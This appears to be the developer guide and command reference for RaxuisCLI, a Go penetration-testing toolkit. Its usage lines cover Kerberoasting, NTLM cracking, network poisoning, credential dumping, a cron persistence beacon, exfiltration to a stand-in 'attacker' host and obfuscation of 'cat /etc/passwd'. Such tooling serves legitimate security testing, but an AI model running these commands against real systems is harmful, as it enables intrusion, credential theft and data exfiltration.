# RaxuisCLI - Documentation

## Overview

RaxuisCLI is a comprehensive cybersecurity CLI toolkit written in Go, designed for penetration testing, CTF challenges, and security analysis.

## Development Guidelines

### Code Style

Keep comments minimal. Only comment on non-obvious behavior (why, not what);
do not add doc comments to every exported function just because it's
exported — `revive`'s `exported` rule is disabled in `.golangci.yml`
specifically so this isn't required. Prefer clear naming and short functions
over narration in comments.

### Adding New Commands

When adding a new command, you MUST:

1. **Create the command file**: `cmd/<domain>/<command>.go`
2. **Create the internal package**: `internal/<domain>/<command>/<command>.go`
3. **Document the command** in this file (see format below)
4. **Update ROADMAP.md** if part of a planned sprint
5. **Update README.md** with the new command documentation

### File Structure (Domain-Based Organization)

```
cmd/
├── root.go                    # Root command (package cmd)
├── network/                   # Network reconnaissance (package network)
│   ├── dns.go
│   ├── whois.go
│   └── recon.go
├── crypto/                    # Cryptography (package crypto)
│   ├── cipher.go
│   ├── jwt.go
│   ├── keygen.go
│   └── certinfo.go
├── web/                       # Web security (package web)
│   ├── http.go
│   ├── fuzz.go
│   ├── cookie.go
│   └── vuln.go
├── redteam/                   # Red team tools (package redteam)
│   ├── ldap.go, kerberos.go, ntlm.go, smb.go
│   ├── poison.go, privesc.go, persist.go
│   ├── creds.go, exfil.go, tunnel.go
│   ├── pivot.go, obfuscate.go
├── container/                 # Container security (package container)
│   ├── container.go
│   └── k8s.go
├── cloud/                     # Cloud security (package cloud)
│   └── cloud.go
└── tools/                     # Utilities (package tools)
    ├── files.go, encode.go, hash.go
    ├── pwgen.go, ports.go, hexdump.go
    ├── strings.go, entropy.go
    ├── metadata.go, todo.go

internal/
├── shared/                    # Shared code
│   ├── constants/             # Severity, VulnType constants
│   ├── models/                # VulnResult, ScanOptions, etc.
│   ├── payloads/              # Centralized payload definitions
│   ├── httpclient/            # Common HTTP client utilities
│   └── display/               # Unified display helpers
├── network/                   # Network packages
│   ├── dns/, whois/, recon/
├── crypto/                    # Crypto packages
│   ├── cipher/, jwt/, keygen/, certinfo/
├── web/                       # Web packages
│   ├── http/, fuzz/, cookie/
│   └── vuln/                  # Split into: xss.go, sqli.go, lfi.go, etc.
├── redteam/                   # Red team packages
│   ├── ldap/, kerberos/, ntlm/, smb/
│   ├── poison/, privesc/, persist/
│   ├── creds/, exfil/, tunnel/, pivot/, obfuscate/
├── container/                 # Container packages
│   ├── container/, k8s/
├── cloud/                     # Cloud packages
│   └── cloud/
└── tools/                     # Tool packages
    ├── files/, encode/, hash/
    ├── pwgen/, ports/, hexdump/
    ├── strings/, entropy/, metadata/, todo/
```

### Command Template

```go
// cmd/<domain>/example.go
package <domain>  // e.g., package network, package crypto

import (
    "raxuiscli/cmd"
    "raxuiscli/internal/<domain>/example"
    "github.com/spf13/cobra"
)

var exampleCmd = &cobra.Command{
    Use:   "example",
    Short: "Short description",
    Long:  `Detailed description with examples.`,
    Run: func(c *cobra.Command, args []string) {
        // Implementation
    },
}

func init() {
    cmd.RootCmd.AddCommand(exampleCmd)
    exampleCmd.Flags().StringP("flag", "f", "", "Flag description")
}
```

**Important**: When creating a new domain package in `cmd/`, you must also add a blank import in `main.go`:
```go
import (
    _ "raxuiscli/cmd/<new_domain>"
)
```

---

## Commands Reference

### Utility Commands

#### `files` - File Operations
Encryption, decryption, shredding, compression, and checksum operations.

```bash
raxuiscli files encrypt <file> --key <key>       # Encrypt file
raxuiscli files decrypt <file> --key <key>       # Decrypt file
raxuiscli files shred <file>                      # Secure delete
raxuiscli files compress <file>                   # Compress file
raxuiscli files extract <archive>                 # Extract archive
raxuiscli files checksum <file>                   # Calculate checksums
```

#### `pwgen` - Password Generator
Generate secure passwords with various options.

```bash
raxuiscli pwgen                                   # Generate password
raxuiscli pwgen --length 20                       # Custom length
raxuiscli pwgen --no-symbols                      # Alphanumeric only
```

#### `ports` - Port Information
Display common ports and their services.

```bash
raxuiscli ports                                   # List common ports
raxuiscli ports --port 443                        # Info on specific port
```

#### `todo` - Task Management
Simple TODO list management.

```bash
raxuiscli todo add "Task description"             # Add task
raxuiscli todo list                               # List tasks
raxuiscli todo done <id>                          # Mark complete
```

---

### Encoding & Analysis

#### `encode` - Encoding/Decoding
Encode and decode data in various formats.

```bash
raxuiscli encode base64 "text"                    # Base64 encode
raxuiscli encode base64 -d "dGV4dA=="             # Base64 decode
raxuiscli encode hex "text"                       # Hex encode
raxuiscli encode url "text with spaces"           # URL encode
```

#### `hash` - Hash Generation
Calculate cryptographic hashes.

```bash
raxuiscli hash md5 "text"                         # MD5 hash
raxuiscli hash sha256 "text"                      # SHA256 hash
raxuiscli hash -f <file>                          # Hash file
```

#### `hexdump` - Hexadecimal Display
Display file contents in hexadecimal format.

```bash
raxuiscli hexdump <file>                          # Display hex dump
raxuiscli hexdump <file> --limit 256              # Limit bytes
```

#### `strings` - String Extraction
Extract printable strings from binary files.

```bash
raxuiscli strings <file>                          # Extract strings
raxuiscli strings <file> --min-length 8           # Minimum length
```

#### `entropy` - Entropy Calculation
Calculate Shannon entropy of files (useful for detecting encryption/compression).

```bash
raxuiscli entropy <file>                          # Calculate entropy
```

#### `metadata` - File Metadata
Extract metadata from files (images, documents, etc.).

```bash
raxuiscli metadata <file>                         # Show metadata
```

---

### Network Reconnaissance

#### `dns` - DNS Operations
DNS lookup, zone transfer, and subdomain enumeration.

```bash
raxuiscli dns lookup example.com                  # A, AAAA, MX, NS, TXT
raxuiscli dns lookup example.com --type ANY       # All records
raxuiscli dns reverse 8.8.8.8                     # Reverse DNS
raxuiscli dns axfr example.com --server ns1.example.com  # Zone transfer
raxuiscli dns brute example.com --wordlist subs.txt      # Subdomain brute
```

#### `whois` - WHOIS Lookup
Domain and IP WHOIS information.

```bash
raxuiscli whois example.com                       # Domain whois
raxuiscli whois 8.8.8.8                           # IP whois
raxuiscli whois AS15169                           # ASN info
```

#### `recon` - Banner Grabbing
Service detection and banner grabbing.

```bash
raxuiscli recon example.com:80                    # Banner grab HTTP
raxuiscli recon example.com:22                    # Banner grab SSH
raxuiscli recon example.com --ports 21,22,80,443  # Multi-ports
```

---

### Cryptography

#### `cipher` - Classical Ciphers
XOR, Vigenère, Caesar, and frequency analysis.

```bash
raxuiscli cipher xor "text" --key "secret"        # XOR encrypt/decrypt
raxuiscli cipher xor-brute "encrypted" --hex      # XOR brute force
raxuiscli cipher vigenere "text" --key "KEY"      # Vigenère cipher
raxuiscli cipher vigenere-crack "ciphertext"      # Crack Vigenère
raxuiscli cipher caesar "text" --shift 3          # Caesar cipher
raxuiscli cipher caesar "text" --brute            # Caesar brute force
raxuiscli cipher rot13 "text"                     # ROT13
raxuiscli cipher atbash "text"                    # Atbash cipher
raxuiscli cipher freq "text"                      # Frequency analysis
raxuiscli cipher detect "ciphertext"              # Detect cipher type
```

#### `jwt` - JWT Operations
JWT decode, forge, and crack operations.

```bash
raxuiscli jwt decode "eyJ..."                     # Decode JWT
raxuiscli jwt verify "eyJ..." --secret "key"      # Verify signature
raxuiscli jwt forge --payload '{"admin":true}' --secret "key"  # Create JWT
raxuiscli jwt crack "eyJ..." --wordlist secrets.txt  # Brute force
raxuiscli jwt crack "eyJ..." --common             # Try common secrets
raxuiscli jwt none-attack "eyJ..."                # Algorithm none attack
raxuiscli jwt check "eyJ..."                      # Security audit
```

#### `keygen` - Key Generation
Generate cryptographic keys and certificates.

```bash
raxuiscli keygen rsa --bits 4096                  # Generate RSA key pair
raxuiscli keygen ecdsa --curve P384               # Generate ECDSA key pair
raxuiscli keygen ed25519                          # Generate Ed25519 key pair
raxuiscli keygen ssh --type ed25519               # Generate SSH key pair
raxuiscli keygen cert --cn example.com --days 365 # Self-signed certificate
raxuiscli keygen aes --bits 256                   # Generate AES key
raxuiscli keygen random --length 32               # Generate random bytes
```

#### `certinfo` - Certificate Analysis
Analyze X.509 certificates from servers or files.

```bash
raxuiscli certinfo example.com                    # Get certificate info
raxuiscli certinfo example.com:8443               # Custom port
raxuiscli certinfo cert.pem                       # Analyze file
raxuiscli certinfo example.com --chain            # Full chain
raxuiscli certinfo chain example.com              # Chain subcommand
raxuiscli certinfo validate example.com           # Validation checks
raxuiscli certinfo san example.com                # Extract SANs
raxuiscli certinfo compare site1.com site2.com    # Compare certificates
```

#### `tlsscan` - TLS/SSL Posture Audit
Assess a server's TLS configuration (protocols, cipher suites, certificate) and
grade it. Passive: only ordinary handshakes. Findings carry a severity.

```bash
raxuiscli tlsscan example.com                     # Audit TLS posture (port 443)
raxuiscli tlsscan example.com:8443                # Custom port
raxuiscli tlsscan example.com --output json       # Machine-readable findings
raxuiscli tlsscan example.com --timeout 5         # Per-connection timeout
```

For a versioned, comparable report (same envelope as `audit web`, diffable with
`compare` and gate-able with `--fail-on`), use the audit variant:

```bash
raxuiscli audit tls example.com                                  # Report on stdout
raxuiscli --output=json --output-file before.json audit tls example.com
raxuiscli --fail-on=high audit tls example.com                   # Non-zero on HIGH+
```

---

### Active Directory / LDAP

#### `ldap` - LDAP Enumeration
Active Directory enumeration via LDAP.

```bash
raxuiscli ldap enum -H dc.domain.local -u user -p pass
raxuiscli ldap users -H dc.domain.local            # Enumerate users
raxuiscli ldap computers -H dc.domain.local        # Enumerate computers
raxuiscli ldap groups -H dc.domain.local           # Enumerate groups
```

#### `kerberos` - Kerberos Attacks
Kerberos attack helpers and hash operations.

```bash
raxuiscli kerberos asrep -u users.txt -d domain.local  # AS-REP roast
raxuiscli kerberos spn -H dc.domain.local              # Kerberoasting
raxuiscli kerberos tickets                             # List tickets
```

#### `ntlm` - NTLM Operations
NTLM hash operations and relay helpers.

```bash
raxuiscli ntlm hash "password"                    # Generate NTLM hash
raxuiscli ntlm crack <hash> -w wordlist.txt       # Crack NTLM
raxuiscli ntlm relay                              # Relay attack info
```

---

### SMB / Network Protocols

#### `smb` - SMB Operations
SMB scanning and share enumeration.

```bash
raxuiscli smb scan 192.168.1.0/24                 # SMB scan
raxuiscli smb shares -H target --user guest       # Enumerate shares
raxuiscli smb null -H target                      # Null session test
```

#### `poison` - Network Poisoning
LLMNR/NBT-NS/mDNS poisoning helpers.

```bash
raxuiscli poison analyze -i eth0                  # Analyze traffic
raxuiscli poison llmnr -i eth0                    # LLMNR commands
raxuiscli poison protocols                        # List protocols
```

---

### Privilege Escalation

#### `privesc` - Privilege Escalation
Linux/Windows privilege escalation checks.

```bash
raxuiscli privesc info                            # System info
raxuiscli privesc suid                            # Find SUID binaries
raxuiscli privesc sudo                            # Check sudo rights
raxuiscli privesc caps                            # Check capabilities
raxuiscli privesc cron                            # Analyze cron jobs
raxuiscli privesc writable                        # Find writable files
```

#### `persist` - Persistence Techniques
Persistence mechanism helpers.

```bash
raxuiscli persist list                            # List techniques
raxuiscli persist list --all                      # All OS techniques
raxuiscli persist check                           # Check existing
raxuiscli persist generate cron "* * * * * /tmp/beacon"
```

---

### Credentials

#### `creds` - Credential Operations
Credential extraction and parsing.

```bash
raxuiscli creds dump                              # Dump locations
raxuiscli creds parse <hashfile>                  # Parse hashes
raxuiscli creds history                           # Shell history
raxuiscli creds ssh                               # SSH keys
```

---

### Cloud Security

#### `cloud` - Cloud Enumeration
AWS, Azure, GCP security enumeration.

```bash
raxuiscli cloud aws s3 --bucket name              # S3 enumeration
raxuiscli cloud aws metadata                      # EC2 metadata
raxuiscli cloud azure blob --account name         # Azure blob
raxuiscli cloud gcp metadata                      # GCP metadata
```

---

### Containers

#### `container` - Container Security
Docker and container security checks.

```bash
raxuiscli container info                          # Container info
raxuiscli container escape                        # Escape techniques
raxuiscli container audit                         # Security audit
raxuiscli container socket                        # Docker socket info
```

#### `k8s` - Kubernetes Security
Kubernetes penetration testing helpers.

```bash
raxuiscli k8s info                                # Cluster info
raxuiscli k8s secrets                             # Secret enumeration
raxuiscli k8s rbac                                # RBAC analysis
raxuiscli k8s escape                              # Escape techniques
```

---

### Tunneling & Pivoting

#### `tunnel` - Network Tunneling
DNS and TCP tunneling.

```bash
raxuiscli tunnel dns --domain tunnel.example.com  # DNS tunnel info
raxuiscli tunnel tcp --local 8080 --remote target:80  # TCP tunnel
```

#### `pivot` - Network Pivoting
SOCKS proxy and port forwarding.

```bash
raxuiscli pivot socks --port 1080                 # SOCKS5 proxy
raxuiscli pivot forward -L 8080:target:80         # Port forward
raxuiscli pivot reverse -R 4444:localhost:22      # Reverse forward
```

---

### Data Exfiltration

#### `exfil` - Data Exfiltration
Exfiltration technique helpers.

```bash
raxuiscli exfil dns -d data.example.com           # DNS exfil
raxuiscli exfil http -u http://attacker/upload    # HTTP exfil
raxuiscli exfil icmp -t attacker                  # ICMP exfil
raxuiscli exfil encode -f sensitive.txt           # Encode for exfil
```

---

### Obfuscation

#### `obfuscate` - Payload Obfuscation
Obfuscate payloads and scripts.

```bash
raxuiscli obfuscate base64 "whoami"               # Base64 obfuscation
raxuiscli obfuscate xor "payload" --key "secret"  # XOR obfuscation
raxuiscli obfuscate powershell "Get-Process"      # PowerShell obfuscation
raxuiscli obfuscate bash "cat /etc/passwd"        # Bash obfuscation
```

---

### Web Security

#### `http` - HTTP Requests
Custom HTTP requests with security header analysis.

```bash
raxuiscli http get https://example.com            # GET request
raxuiscli http post https://api.com -d '{"x":1}'  # POST with data
raxuiscli http put https://api.com -d '...'       # PUT request
raxuiscli http delete https://api.com/item/1      # DELETE request
raxuiscli http head https://example.com           # HEAD request
raxuiscli http options https://api.com            # OPTIONS request
raxuiscli http headers https://example.com        # Security header analysis
raxuiscli http trace https://bit.ly/xxx           # Trace redirects
raxuiscli http curl https://api.com -X POST -d '{"x":1}'  # Generate curl
```

#### `fuzz` - Web Fuzzing
Directory, parameter, and virtual host fuzzing.

```bash
raxuiscli fuzz dir https://example.com -w dirs.txt     # Directory brute force
raxuiscli fuzz dir https://example.com --common        # Use common wordlist
raxuiscli fuzz dir https://example.com -e php,html     # With extensions
raxuiscli fuzz param "https://site.com?q=test" -w params.txt  # Parameter fuzzing
raxuiscli fuzz param "https://site.com" --common       # Common parameters
raxuiscli fuzz vhost https://10.10.10.10 -w vhosts.txt # Virtual host discovery
raxuiscli fuzz vhost https://target.com -d example.com # With domain suffix
```

#### `vuln` - Vulnerability Scanning
XSS, SQLi, LFI, command injection, CORS, NoSQLi, XXE, GraphQL, Host Header, and Race Condition detection.

```bash
# Basic vulnerability scanning
raxuiscli vuln scan "https://site.com?id=1"       # Quick vulnerability scan
raxuiscli vuln xss "https://site.com?q=test"      # Test for XSS
raxuiscli vuln sqli "https://site.com?id=1"       # Test for SQL injection
raxuiscli vuln lfi "https://site.com?file=about"  # Test for LFI
raxuiscli vuln headers https://example.com        # Security headers check
raxuiscli vuln payloads xss --level 3             # List XSS payloads
raxuiscli vuln payloads sqli --level 2            # List SQLi payloads

# CORS Misconfiguration
raxuiscli vuln cors https://api.com               # Test CORS configuration
raxuiscli vuln cors https://api.com --origin "https://evil.com"  # Custom origin
raxuiscli vuln cors https://api.com --full        # Full GET + preflight tests

# NoSQL Injection (MongoDB)
raxuiscli vuln nosqli "https://api.com/users?id=1"  # URL parameter testing
raxuiscli vuln nosqli "https://api.com/login" -d '{"user":"test","pass":"test"}'  # JSON body
raxuiscli vuln nosqli "https://api.com" --level 3   # Aggressive payloads

# XXE (XML External Entity)
raxuiscli vuln xxe https://api.com/upload         # Test XML endpoint
raxuiscli vuln xxe https://api.com --payload file # File disclosure payloads
raxuiscli vuln xxe https://api.com --oob http://callback.com  # OOB exfiltration

# GraphQL Security
raxuiscli vuln graphql https://api.com/graphql    # Test GraphQL endpoint
raxuiscli vuln graphql https://api.com/graphql --introspect  # Focus on introspection
raxuiscli vuln graphql https://api.com/graphql --dos  # Test query batching/nesting DoS

# Host Header Injection
raxuiscli vuln host https://example.com           # Test host header injection
raxuiscli vuln host https://example.com --poison  # Password reset poisoning test
raxuiscli vuln host https://example.com --cache   # Web cache poisoning test

# Race Conditions
raxuiscli vuln race "https://api.com/transfer" -d '{"amount":100}' --requests 50
raxuiscli vuln race "https://api.com/redeem" -d '{"code":"PROMO"}' --requests 20
raxuiscli vuln race "https://api.com/vote" -X POST --requests 30
```

#### `cookie` - Cookie Analysis
Cookie decoding and security analysis.

```bash
raxuiscli cookie decode "eyJhZG1pbiI6dHJ1ZX0="    # Decode cookie value
raxuiscli cookie analyze "session=abc; HttpOnly"  # Analyze security flags
raxuiscli cookie flask ".eJx..." --secret "key"   # Decode Flask session
raxuiscli cookie express "s:..." --secret "key"   # Decode Express session
raxuiscli cookie detect ".eJxNjDEOwCAIAP..."      # Detect session type
raxuiscli cookie sensitive '{"user":"admin"}'     # Find sensitive data
raxuiscli cookie bulk "sess=x" "user=y" "tok=z"   # Analyze multiple cookies
```

---

## Build & Run

```bash
# Build
go build -o bin/raxuiscli .

# Run
./bin/raxuiscli <command> [subcommand] [flags]

# Help
./bin/raxuiscli --help
./bin/raxuiscli <command> --help
```

---

## Project Status

See `ROADMAP.md` for implementation progress and planned features.
